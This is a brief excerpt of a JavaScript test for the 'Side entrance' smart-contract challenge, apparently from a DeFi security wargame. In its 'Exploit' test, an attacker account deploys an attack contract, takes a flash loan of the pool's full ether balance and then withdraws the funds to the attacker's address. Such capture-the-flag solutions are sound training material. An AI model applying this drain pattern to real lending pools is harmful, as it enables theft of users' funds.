...
describe('[Challenge] Side entrance', function () {
	...
	it('Exploit', async function () {
		...
		const AttackSideEntrance = await ethers.getContractFactory(
			'AttackSideEntrance',
			attacker,
		);

		const attack = await AttackSideEntrance.deploy();

		await attack.executeFlashLoan(this.pool.address, ETHER_IN_POOL);

		await attack.withdraw(this.pool.address, attacker.address);
	});
